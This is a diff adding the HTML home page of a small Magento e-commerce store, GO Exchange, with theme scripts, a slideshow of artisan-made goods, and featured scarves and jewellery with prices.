@@ -1,0 +1,630 @@
+<!doctype html>
+<!-- paulirish.com/2008/conditional-stylesheets-vs-css-hacks-answer-neither/ -->
+<!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+<!--[if IE 7]>    <html class="no-js lt-ie9 lt-ie8" lang="en"> <![endif]-->
+<!--[if IE 8]>    <html class="no-js lt-ie9" lang="en" xmlns:fb="http://www.facebook.com/2008/fbml"> <![endif]-->
+<!-- Consider adding a manifest.appcache: h5bp.com/d/Offline -->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en"> <!--<![endif]-->
+<head>
+	<!--[if IE]><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" /><![endif]-->
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+<title>e3p home</title>
+<meta name="description" content="Default Description"/>
+<meta name="keywords" content="GO Exchange, GO Project, GO Gear"/>
+<meta name="robots" content="INDEX,FOLLOW"/>
+<link rel="icon" href="http://iamsecondcollective.com/media/favicon/default/favicon_1.png" type="image/x-icon"/>
+<link rel="shortcut icon" href="http://iamsecondcollective.com/media/favicon/default/favicon_1.png" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="http://iamsecondcollective.com/skin/frontend/athletee3p/default/apple-touch-icon.png"/>
+<link rel="apple-touch-icon" sizes="72x72" href="http://iamsecondcollective.com/skin/frontend/athletee3p/default/apple-touch-icon-72x72.png"/>
+<link rel="apple-touch-icon" sizes="114x114" href="http://iamsecondcollective.com/skin/frontend/athletee3p/default/apple-touch-icon-114x114.png"/>
+<!--[if lt IE 7]>
+<script type="text/javascript">
+	//<![CDATA[
+    var BLANK_URL = 'http://iamsecondcollective.com/js/blank.html';
+    var BLANK_IMG = 'http://iamsecondcollective.com/js/spacer.gif';
+//]]>
+</script>
+<![endif]-->
+<script type="text/javascript">
+	//<![CDATA[
+	var Athlete = {};
+	Athlete.url = 'http://iamsecondcollective.com/';
+	Athlete.store = 'ep3storeview';
+	Athlete.header_search = 0;
+	Athlete.button_icons = 'black';
+	Athlete.text = {};
+	Athlete.text.out_of = '%s out of 5';
+		Athlete.login_bg = '';
+		Athlete.totop = 1;
+	Athlete.responsive = 1;
+	Athlete.sticky = 0;
+	Athlete.breakpoints = [426,756,960,1200,1300,1380,1520];
+	//]]>
+</script>
+<link rel="stylesheet" type="text/css" href="http://iamsecondcollective.com/js/olegnax/fancybox/jquery.fancybox-1.3.4.css" />
+<link rel="stylesheet" type="text/css" href="http://iamsecondcollective.com/skin/frontend/athletee3p/default/css/styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://iamsecondcollective.com/skin/frontend/base/default/css/widgets.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://iamsecondcollective.com/skin/frontend/athletee3p/default/aw_blog/css/style.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://iamsecondcollective.com/skin/frontend/base/default/lookbookslider/css/lookbookslider.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://iamsecondcollective.com/skin/frontend/athletee3p/default/css/olegnax/ajaxcart.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://iamsecondcollective.com/skin/frontend/athletee3p/default/css/slideshow.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://iamsecondcollective.com/skin/frontend/athletee3p/default/rs-plugin/css/settings.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://iamsecondcollective.com/skin/frontend/athletee3p/default/css/olegnax/megamenu.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://iamsecondcollective.com/skin/frontend/athletee3p/default/css/local.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://iamsecondcollective.com/skin/frontend/athletee3p/default/owl-carousel/owl.carousel.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://iamsecondcollective.com/skin/frontend/athletee3p/default/owl-carousel/owl.theme.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://iamsecondcollective.com/skin/frontend/athletee3p/default/owl-carousel/owl.transitions.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://iamsecondcollective.com/skin/frontend/athletee3p/default/css/custom.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://iamsecondcollective.com/skin/frontend/athletee3p/default/css/animation.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://iamsecondcollective.com/skin/frontend/athletee3p/default/css/grid.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://iamsecondcollective.com/skin/frontend/athletee3p/default/css/retina.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://iamsecondcollective.com/skin/frontend/athletee3p/default/font-awesome/css/font-awesome.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://iamsecondcollective.com/skin/frontend/athletee3p/default/css/options_e3pweb_ep3storeview.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://iamsecondcollective.com/skin/frontend/athletee3p/default/css/override.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://iamsecondcollective.com/skin/frontend/athletee3p/default/css/print.css" media="print" />
+<script type="text/javascript" src="http://iamsecondcollective.com/js/prototype/prototype.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/js/lib/ccard.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/js/prototype/validation.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/js/scriptaculous/builder.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/js/scriptaculous/effects.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/js/scriptaculous/dragdrop.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/js/scriptaculous/controls.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/js/scriptaculous/slider.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/js/varien/js.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/js/varien/form.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/js/mage/translate.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/js/mage/cookies.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/js/ebizmarts/magemonkey/campaignCatcher.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/js/olegnax/jquery-1.11.0.min.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/js/olegnax/jquery-migrate-1.2.1.min.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/js/olegnax/jquery.noconflict.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/js/olegnax/fancybox/jquery.fancybox-1.3.4.pack.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/js/olegnax/base64.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/js/olegnax/jquery.cycle2.min.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/js/olegnax/jquery.easing.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/js/olegnax/jquery.swipe.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/js/olegnax/jquery.jcarousel.min.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/js/olegnax/jquery.anystretch.1.2.min.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/skin/frontend/athletee3p/default/aw_blog/js/script.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/skin/frontend/athletee3p/default/js/olegnax/ajaxcart.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/skin/frontend/athletee3p/default/js/slideshow.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/skin/frontend/athletee3p/default/rs-plugin/js/jquery.themepunch.tools.min.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/skin/frontend/athletee3p/default/rs-plugin/js/jquery.themepunch.revolution.min.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/skin/frontend/athletee3p/default/rs-plugin/js/script.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/skin/frontend/athletee3p/default/js/olegnax/megamenu.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/skin/frontend/athletee3p/default/owl-carousel/owl.carousel.min.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/skin/frontend/athletee3p/default/js/script.js"></script>
+<link href="http://iamsecondcollective.com/rss/catalog/new/store_id/4/" title="New Products" rel="alternate" type="application/rss+xml" />
+<link href="http://iamsecondcollective.com/rss/catalog/special/store_id/4/cid/0/" title="Special Products" rel="alternate" type="application/rss+xml" />
+<!--[if lt IE 8]>
+<link rel="stylesheet" type="text/css" href="http://iamsecondcollective.com/skin/frontend/athletee3p/default/css/styles-ie.css" media="all" />
+<![endif]-->
+<!--[if lt IE 7]>
+<script type="text/javascript" src="http://iamsecondcollective.com/js/lib/ds-sleight.js"></script>
+<script type="text/javascript" src="http://iamsecondcollective.com/skin/frontend/base/default/js/ie6.js"></script>
+<![endif]-->
+<!--[if lt IE 9]>
+<link rel="stylesheet" type="text/css" href="http://iamsecondcollective.com/skin/frontend/athletee3p/default/rs-plugin/css/settings-ie8.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://iamsecondcollective.com/skin/frontend/athletee3p/default/css/ie.css" media="all" />
+<script type="text/javascript" src="http://iamsecondcollective.com/js/olegnax/html5shiv.js"></script>
+<![endif]-->
+	<link href='//fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800|Average+Sans:300,400,600,700,800' rel='stylesheet' type='text/css'>
+
+<script type="text/javascript">
+//<![CDATA[
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.iamsecondcollective.com';
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = ["HK","IE","MO","PA"];
+//]]>
+</script>
+            <!-- BEGIN GOOGLE UNIVERSAL ANALYTICS CODE -->
+        <script type="text/javascript">
+        //<![CDATA[
+            (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+            })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+            
+ga('create', 'UA-70828666-1', 'auto');
+
+ga('send', 'pageview');
+            
+        //]]>
+        </script>
+        <!-- END GOOGLE UNIVERSAL ANALYTICS CODE -->
+    <script type="text/javascript">//<![CDATA[
+        var Translator = new Translate([]);
+        //]]></script></head>
+<body class="  cms-index-index grid-fluid cms-e3p cms-e3p">
+<!-- Prompt IE 6 users to install Chrome Frame. Remove this if you support IE 6.
+     chromium.org/developers/how-tos/chrome-frame-getting-started -->
+<!--[if lt IE 7]><p class=chromeframe>Your browser is <em>ancient!</em> <a href="http://browsehappy.com/">Upgrade to a different browser</a> or <a href="http://www.google.com/chromeframe/?redirect=true">install Google Chrome Frame</a> to experience this site.</p><![endif]-->
+<div class="wrapper">
+        <noscript>
+        <div class="global-site-notice noscript">
+            <div class="notice-inner">
+                <p>
+                    <strong>JavaScript seems to be disabled in your browser.</strong><br />
+                    You must have JavaScript enabled in your browser to utilize the functionality of this website.                </p>
+            </div>
+        </div>
+    </noscript>
+    <div class="page">
+        	<div class="header-container full-header ">
+		<div class="header header-1 row">
+			<div class="grid_18">
+				<div class="table-container">
+					<div class="table-cell v-align-cell logo-container">
+						<div class="logo-container-indent">
+															<h1 class="logo">
+									<strong>GO Exchange</strong>
+									<a href="http://iamsecondcollective.com/" title="GO Exchange">
+										<img class="" width="200" height="" src="http://iamsecondcollective.com/media/wysiwyg/TheCollective.jpg" alt="" />									</a>
+								</h1>
+													</div>
+					</div>
+										<div class="table-cell header-info-container">
+						<div class="relative">
+							<div class="top-links-container ">
+								<!-- cart BOF -->
+<div class="header-switch header-cart">
+	<a class="header-switch-trigger summary icon-white" href="http://iamsecondcollective.com/checkout/cart/">
+		<span>My Cart</span><span class="qty">0</span>	</a>
+	<div class="header-dropdown">
+									<p class="a-center">You have no items in your shopping cart.</p>
+			</div>
+</div>
+<!-- cart EOF -->								<div class="top-links"><ul class="links">
+                     <li class="first" ><a href="https://iamsecondcollective.com/customer/account/" title="My Account" >My Account</a></li>
+                                <li ><a href="https://iamsecondcollective.com/wishlist/" title="My Wishlist" >My Wishlist</a></li>
+                                <li ><a href="https://iamsecondcollective.com/checkout/" title="Checkout" class="top-link-checkout">Checkout</a></li>
+                                <li class=" last" ><a href="https://iamsecondcollective.com/customer/account/login/referer/aHR0cDovL2lhbXNlY29uZGNvbGxlY3RpdmUuY29tLw,,/" title="Log In" >Log In</a></li>
+            </ul>
+</div>
+								<div class="clear"></div>
+							</div>
+							<div class="nav-search-container ">
+								<form id="search_mini_form" action="http://iamsecondcollective.com/catalogsearch/result/" method="get">
+    <div class="form-search">
+	    <button type="submit" title="Search" class="button icon-white"><span><span>Search</span></span></button>
+	    <label for="search">Search:</label>
+        <div class="input-overflow"><input id="search" type="text" name="q" value="" class="input-text" maxlength="128" /></div>
+        <div id="search_autocomplete" class="search-autocomplete"></div>
+        <script type="text/javascript">
+        //<![CDATA[
+            var searchForm = new Varien.searchForm('search_mini_form', 'search', 'Search entire store here...');
+            searchForm.initAutocomplete('http://iamsecondcollective.com/catalogsearch/ajax/suggest/', 'search_autocomplete');
+        //]]>
+        </script>
+    </div>
+</form>
+										<div class="nav-container olegnaxmegamenu icons-white">
+		<div class="nav-top-title"><div class="icon"><span></span><span></span><span></span></div><a href="#">Navigation</a></div>
+		<ul id="nav">
+						<li  class="level0 nav-1 first  level-top default parent"><a href="http://iamsecondcollective.com/bags.html" ><span>Bags</span></a><div class="megamenu-dropdown"><ul class="level0"><li  class="level1 nav-1-1 first last"><a href="http://iamsecondcollective.com/bags/crossbody-purses.html" ><span>Crossbody Purses</span></a></li></ul><div class="clear"></div></div></li><li  class="level0 nav-2  level-top default parent"><a href="http://iamsecondcollective.com/jewelry.html" ><span>Jewelry</span></a><div class="megamenu-dropdown"><ul class="level0"><li  class="level1 nav-2-1 first"><a href="http://iamsecondcollective.com/jewelry/necklaces.html" ><span>Necklaces</span></a></li><li  class="level1 nav-2-2"><a href="http://iamsecondcollective.com/jewelry/bracelets.html" ><span>Bracelets</span></a></li><li  class="level1 nav-2-3 last"><a href="http://iamsecondcollective.com/jewelry/earrings.html" ><span>Earrings</span></a></li></ul><div class="clear"></div></div></li><li  class="level0 nav-3  level-top default parent"><a href="http://iamsecondcollective.com/accessories.html" ><span>Accessories</span></a><div class="megamenu-dropdown"><ul class="level0"><li  class="level1 nav-3-1 first"><a href="http://iamsecondcollective.com/accessories/scarves.html" ><span>Scarves</span></a></li><li  class="level1 nav-3-2 last"><a href="http://iamsecondcollective.com/accessories/headbands.html" ><span>Headbands</span></a></li></ul><div class="clear"></div></div></li><li  class="level0 nav-4 last  level-top default"><a href="http://iamsecondcollective.com/the-goex-story.html" ><span>Our Story</span></a></li>					</ul>
+	</div>
+															</div>
+						</div>
+					</div>
+				</div>
+							</div>
+		</div>
+	</div>
+<!-- SLIDESHOW -->
+<div class="slideshow-container fullwidthbanner-container icons-white">
+    <div class="revolution-slideshow fullwidthbanner">
+        <ul>
+	        			<li  data-transition="fade" data-masterspeed="400" >
+                                <img src="http://iamsecondcollective.com/media/olegnax/athlete/revolution/Scarves_Made_in_Uganda.jpg" alt="" />
+                							</li>
+					<li  data-transition="fade" data-masterspeed="400" >
+                                <img src="http://iamsecondcollective.com/media/olegnax/athlete/revolution/Made_In_Haiti3.jpg" alt="" />
+                							</li>
+					<li  data-transition="fade" data-masterspeed="400" >
+                                <img src="http://iamsecondcollective.com/media/olegnax/athlete/revolution/Makilene_Necklace_Scuba.jpg" alt="" />
+                							</li>
+					<li  data-transition="fade" data-masterspeed="400" >
+                                <img src="http://iamsecondcollective.com/media/olegnax/athlete/revolution/Made_by_Artisans2.jpg" alt="" />
+                							</li>
+		        </ul>
+	            <div class="tp-bannertimer tp-top"></div>
+	        </div>
+</div>
+<script type="text/javascript">
+    var CONFIG_REVOLUTION = {
+        delay:5000,
+        startwidth:1360,
+        startheight:600,
+
+	    keyboardNavigation: "off",
+
+	    onHoverStop:"on",
+	    thumbWidth:100,
+	    thumbHeight:30,
+	    thumbAmount:3,
+	    hideThumbs:200,
+        navigationType:"none",
+        navigationArrows:"solo",
+        navigationStyle:"athlete",
+        touchenabled:"on",
+
+	    soloArrowLeftHalign:"left",
+	    soloArrowLeftValign:"center",
+	    soloArrowLeftHOffset:-10,
+	    soloArrowLeftVOffset:0,
+
+	    soloArrowRightHalign:"right",
+	    soloArrowRightValign:"center",
+	    soloArrowRightHOffset:-10,
+	    soloArrowRightVOffset:0,
+
+	    stopAtSlide:-1,
+	    stopAfterLoops:-1,
+
+	    hideCaptionAtLimit:0,
+	    hideAllCaptionAtLilmit:0,
+	    hideSliderAtLimit:0,
+
+        fullWidth:"on",
+
+	    shuffle:"off"
+    };
+</script>
+<!-- SLIDESHOW EOF -->        <div class="main-container col-layouts col1-layout">
+	        <div class="content-container">
+		        <div class="main row clearfix">
+	                <div class="col-main grid_18">
+	                    	                    						
+<div class="std"><img src="http://iamsecondcollective.com/media/wysiwyg/E3-Partner-Banner3.png" alt="" width="100%"/>
+<!--
+<div class="four-boxes">
+<a href="http://iamsecondcollective.com/dollar-deals.html"><img style="padding: 10px;" src="http://iamsecondcollective.com/media/wysiwyg/block1.jpg" alt="" /></a>
+<a href="http://iamsecondcollective.com/about-us"><img style="padding: 10px;" src="http://iamsecondcollective.com/media/wysiwyg/block2.jpg" alt="" /></a>
+<a href="http://iamsecondcollective.com/contact-us"><img style="padding: 10px;" src="http://iamsecondcollective.com/media/wysiwyg/block1.jpg" alt="" /></a>
+<a href="http://iamsecondcollective.com/shipping-policy"><img style="padding: 10px;" src="http://iamsecondcollective.com/media/wysiwyg/block2.jpg" alt="" /></a>
+</div>
+<div class="four-boxes-wide-tablet">
+<div style="width: 100%; margin: 0 auto; clear: both;">
+<div style="float:left; max-width: 370px; width: 25%;">
+<a href="http://iamsecondcollective.com/dollar-deals.html"><img src="http://iamsecondcollective.com/media/wysiwyg/block1.jpg" alt="" width="100%"/></a>
+</div>
+<div style="float:left; max-width: 370px; width: 25%;">
+<a href="http://iamsecondcollective.com/about-us"><img src="http://iamsecondcollective.com/media/wysiwyg/block2.jpg" alt="" width="100%"/></a>
+</div>
+<div style="float:left; max-width: 370px; width: 25%;">
+<a href="http://iamsecondcollective.com/contact-us"><img src="http://iamsecondcollective.com/media/wysiwyg/block1.jpg" width="100%"/></a>
+</div>
+<div style="float:left; max-width: 370px; width: 25%;">
+<a href="http://iamsecondcollective.com/shipping-policy"><img src="http://iamsecondcollective.com/media/wysiwyg/block2.jpg" width="100%"/></a>
+</div>
+</div>
+</div>
+<div class="four-boxes-tablet">
+<div style="width: 100%; margin: 0 auto; clear: both;">
+<div style="float:left; max-width: 370px; width: 25%;">
+<a href="http://iamsecondcollective.com/dollar-deals.html"><img src="http://iamsecondcollective.com/media/wysiwyg/block1.jpg" alt="" width="100%"/></a>
+</div>
+<div style="float:left; max-width: 370px; width: 25%;">
+<a href="http://iamsecondcollective.com/about-us"><img src="http://iamsecondcollective.com/media/wysiwyg/block2.jpg" alt="" width="100%"/></a>
+</div>
+<div style="float:left; max-width: 370px; width: 25%;">
+<a href="http://iamsecondcollective.com/contact-us"><img src="http://iamsecondcollective.com/media/wysiwyg/block1.jpg" width="100%"/></a>
+</div>
+<div style="float:left; max-width: 370px; width: 25%;">
+<a href="http://iamsecondcollective.com/shipping-policy"><img src="http://iamsecondcollective.com/media/wysiwyg/block2.jpg" width="100%"/></a>
+</div>
+</div>
+</div>
+<div class="four-boxes-mobile">
+<div style="width: 100%; margin: 0 auto; clear: both;">
+<div style="float:left; max-width: 370px; width: 33%;">
+<a href="http://iamsecondcollective.com/dollar-deals.html"><img src="http://iamsecondcollective.com/media/wysiwyg/block1.jpg" alt="" width="100%"/></a>
+</div>
+<div style="float:left; max-width: 370px; width: 33%;">
+<a href="http://iamsecondcollective.com/about-us"><img src="http://iamsecondcollective.com/media/wysiwyg/block2.jpg" alt="" width="100%"/></a>
+</div>
+<div style="float:left; max-width: 370px; width: 33%;">
+<a href="http://iamsecondcollective.com/shipping-policy"><img src="http://iamsecondcollective.com/media/wysiwyg/block1.jpg" width="100%"/></a>
+</div>
+</div>
+</div-->
+<!---->
+<div class="product-slider-container category-products  product-columns-5">
+	<div class="clearfix title-container">
+		<h3>Featured Products</h3><div class="slider-nav" id="slider_athlete_5806fc2d48bc0_nav" ><ul><li><a class="prev icon-white mm-icon-black" href="#"></a></li><li><a class="next icon-white mm-icon-black" href="#"></a></li></ul></div>
+	</div>
+	<div class="slider-container">
+	    <ul id="slider_athlete_5806fc2d48bc0" class="carousel-slider products-grid clearfix"
+	        data-items="[ [0, 2], [426, 3], [756, 4], [960, 5]]"
+	        data-autoscroll="0"
+	        data-scroll="item"
+	        data-rewind="0"
+		>
+	    		                <li class="item ">
+	            <div class="item-wrap">
+                <a href="http://iamsecondcollective.com/100-cotton-hand-batiked-scarf-85-x20-in-mustard-chevron.html" title="Mustard Chevron Scarf" class="product-image">
+	                	                <img class="additional_img" src="http://iamsecondcollective.com/media/catalog/product/cache/4/small_image/296x444/9df78eab33525d08d6e5fb8d27136e95/s/c/scarves-web23.jpg" data-srcX2="http://iamsecondcollective.com/media/catalog/product/cache/4/small_image/592x888/9df78eab33525d08d6e5fb8d27136e95/s/c/scarves-web23.jpg" width="296" height="444" alt="Mustard Chevron Scarf" />	                <img class="regular_img" src="http://iamsecondcollective.com/media/catalog/product/cache/4/small_image/296x444/9df78eab33525d08d6e5fb8d27136e95/s/c/scarves-web36.jpg" data-srcX2="http://iamsecondcollective.com/media/catalog/product/cache/4/small_image/592x888/9df78eab33525d08d6e5fb8d27136e95/s/c/scarves-web36.jpg" width="296" height="444" alt="Mustard Chevron Scarf" />                </a>
+                <div class="product-hover">
+	                		                <h2 class="product-name"><a href="http://iamsecondcollective.com/100-cotton-hand-batiked-scarf-85-x20-in-mustard-chevron.html" title="Mustard Chevron Scarf">Mustard Chevron Scarf</a></h2><br/>
+	                	                		                
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-544_slider">
+                                            <span class="price">$28.00</span>                                    </span>
+                        
+        </div>
+
+	                                </div>
+                <div class="name">
+	                
+                    <div class="actions">
+	                    	                </div>
+                </div>
+
+		            
+	            </div>
+            </li>
+        		                <li class="item  sale-product">
+	            <div class="item-wrap">
+                <a href="http://iamsecondcollective.com/scarf-lux-hand-batik-lt-gray-graduated-stripe.html" title="Gray Stripe Lux Scarf" class="product-image">
+	                	                <img class="additional_img" src="http://iamsecondcollective.com/media/catalog/product/cache/4/small_image/296x444/9df78eab33525d08d6e5fb8d27136e95/s/c/scarves-web21.jpg" data-srcX2="http://iamsecondcollective.com/media/catalog/product/cache/4/small_image/592x888/9df78eab33525d08d6e5fb8d27136e95/s/c/scarves-web21.jpg" width="296" height="444" alt="Gray Stripe Lux Scarf" />	                <img class="regular_img" src="http://iamsecondcollective.com/media/catalog/product/cache/4/small_image/296x444/9df78eab33525d08d6e5fb8d27136e95/s/c/scarves-web38.jpg" data-srcX2="http://iamsecondcollective.com/media/catalog/product/cache/4/small_image/592x888/9df78eab33525d08d6e5fb8d27136e95/s/c/scarves-web38.jpg" width="296" height="444" alt="Gray Stripe Lux Scarf" />                </a>
+                <div class="product-hover">
+	                		                <h2 class="product-name"><a href="http://iamsecondcollective.com/scarf-lux-hand-batik-lt-gray-graduated-stripe.html" title="Gray Stripe Lux Scarf">Gray Stripe Lux Scarf</a></h2><br/>
+	                	                		                
+
+                        
+    <div class="price-box">
+                                            
+        
+                            <p class="special-price">
+                    <span class="price-label"></span>
+                <span class="price" id="product-price-1351_slider">
+                    $25.00                </span>
+                </p>
+            
+		    <p class="old-price">
+			    <span class="price-label"></span>
+                <span class="price" id="old-price-1351_slider">
+                    $38.00                </span>
+		    </p>
+
+        
+    
+        </div>
+
+	                                </div>
+                <div class="name">
+	                
+                    <div class="actions">
+	                    	                </div>
+                </div>
+
+		            
+	            </div>
+            </li>
+        		                <li class="item ">
+	            <div class="item-wrap">
+                <a href="http://iamsecondcollective.com/leila-necklace-in-lucite.html" title="Leila Necklace in Lucite" class="product-image">
+	                	                <img class="additional_img" src="http://iamsecondcollective.com/media/catalog/product/cache/4/small_image/296x444/9df78eab33525d08d6e5fb8d27136e95/g/o/goex-necklacebust-web07.jpg" data-srcX2="http://iamsecondcollective.com/media/catalog/product/cache/4/small_image/592x888/9df78eab33525d08d6e5fb8d27136e95/g/o/goex-necklacebust-web07.jpg" width="296" height="444" alt="Leila Necklace in Lucite" />	                <img class="regular_img" src="http://iamsecondcollective.com/media/catalog/product/cache/4/small_image/296x444/9df78eab33525d08d6e5fb8d27136e95/g/o/goex-necklace-web07.jpg" data-srcX2="http://iamsecondcollective.com/media/catalog/product/cache/4/small_image/592x888/9df78eab33525d08d6e5fb8d27136e95/g/o/goex-necklace-web07.jpg" width="296" height="444" alt="Leila Necklace in Lucite" />                </a>
+                <div class="product-hover">
+	                		                <h2 class="product-name"><a href="http://iamsecondcollective.com/leila-necklace-in-lucite.html" title="Leila Necklace in Lucite">Leila Necklace in Lucite</a></h2><br/>
+	                	                		                
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-1818_slider">
+                                            <span class="price">$68.00</span>                                    </span>
+                        
+        </div>
+
+	                                </div>
+                <div class="name">
+	                
+                    <div class="actions">
+	                    	                </div>
+                </div>
+
+		            
+	            </div>
+            </li>
+               </ul>
+	</div>
+</div></div>
+	                </div>
+	            </div>
+            </div>
+	        <div class="top-footer">
+	<div class="row clearfix">
+		<div class="grid_18">
+			<p></p>                </div>
+	</div>
+</div>
+<div class="footer-container">
+	<div class="footer row clearfix">
+		<div class="grid_18">
+			<div class="footer-info clearfix">
+				<!-- 4 column -->
+<div class="info-content clearfix">
+<div class="one_fourth">
+<h4>SHOP</h4>
+<ul>
+<li><a href="http://iamsecondcollective.com/bags.html/">Bags</a></li>
+<li>&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://iamsecondcollective.com/bags/crossbody-purses.html/">Crossbody Purses</a>
+<li><a href="http://iamsecondcollective.com/jewelry.html/">Jewelry</a></li>
+<li>&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://iamsecondcollective.com/jewelry/necklaces.html/">Necklaces</a>&nbsp;|&nbsp;<a href="http://iamsecondcollective.com/jewelry/bracelets.html/">Bracelets</a>&nbsp;|&nbsp;<a href="http://iamsecondcollective.com/jewelry/earrings.html/">Earrings</a>
+<li><a href="http://iamsecondcollective.com/accessories.html/">Accessories</a></li>
+<li>&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://iamsecondcollective.com/accessories/scarves.html/">Scarves</a>&nbsp;|&nbsp;<a href="http://iamsecondcollective.com/accessories/headbands.html/">Headbands</a>
+<!--<li><a href="http://iamsecondcollective.com/gifts.html/">Gifts</a></li>
+<li>&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://iamsecondcollective.com/gifts/plush-toys.html/">Plush Toys</a>-->
+</ul>
+</div>
+<div class="one_fourth">
+<h4>ABOUT</h4>
+<ul>
+<li><a href="http://iamsecondcollective.com/the-goex-story.html/">Our Story</a></li>
+<li><a href="http://www.iamsecond.com/">I Am Second</a></li>
+</ul>
+</div>
+<div class="one_fourth">
+<h4>CONTACT US</h4>
+<ul>
+<li><a>Customer Service:</a></li>
+<li><a href="tel:1-816-800-8284">816.800.8284</a>   |   <a href="mailto:cs@goex.org">Email Us</a>
+<li><a href="http://iamsecondcollective.com/returns-exchanges/">Returns and Exchanges</a></li>
+<li><a href="http://iamsecondcollective.com/contact/">Contact Us</a></li>
+</ul>
+</div>
+<div class="one_fourth last">
+<h4>FOLLOW US</h4>
+<a title="Rss" class="social-icon icon-rss inverted-icon" href="http://www.iamsecond.com/feed/" target="_social"></a><a title="Facebook" class="social-icon icon-facebook inverted-icon" href="https://www.facebook.com/IamSecond" target="_social"></a><a title="Twitter" class="social-icon icon-twitter inverted-icon" href="https://twitter.com/IamSecond/" target="_social"></a><a title="Blogger" class="social-icon icon-blogger inverted-icon" href="http://www.iamsecond.com/category/i-am-second-blog/" target="_social"></a>
+</div>
+</div>			</div>
+					</div>
+	</div>
+</div>
+<div class="copyright-container">
+	<div class="row clearfix">
+		<div class="grid_18">
+			<div class="cc-icons"><img src="http://iamsecondcollective.com/media/wysiwyg/RapidSSL_SEAL-90x50.gif" alt="" style="padding: 0 10px;" /><img width="244" height="23"  src="http://iamsecondcollective.com/media/olegnax/athlete/cc_icons.png" alt="credit card icons" />
+			</div>
+			<address></address>
+		</div>
+	</div>
+</div>        </div>
+	    	    
+
+<div itemscope="" itemtype="https://schema.org/Organization">
+    <meta itemprop="name" content="GO Exchange" />
+    <meta itemprop="url" content="http://iamsecondcollective.com/" />
+    <meta itemprop="logo" content="http://iamsecondcollective.com/skin/frontend/base/default/images/logo.png" />
+</div><script type="text/javascript">
+	//<![CDATA[
+	if (typeof Olegnax == "undefined") var Olegnax = {};
+	if (typeof Olegnax.Ajaxcart == "undefined") {
+		Olegnax.Ajaxcart = {
+			translation : {},
+			options : {},
+			helpers : {}
+		};
+	}
+	Olegnax.Ajaxcart.baseUrl = 'http://iamsecondcollective.com/';
+	Olegnax.Ajaxcart.options.status = 1;
+	Olegnax.Ajaxcart.options.quick_view = 0;
+	Olegnax.Ajaxcart.options.wishlist = 1;
+	Olegnax.Ajaxcart.options.compare = 1;
+
+	Olegnax.Ajaxcart.translation.quick_view = 'Quick View';
+	//]]>
+</script><script type="application/ld+json">
+{
+   "@context": "https://schema.org",
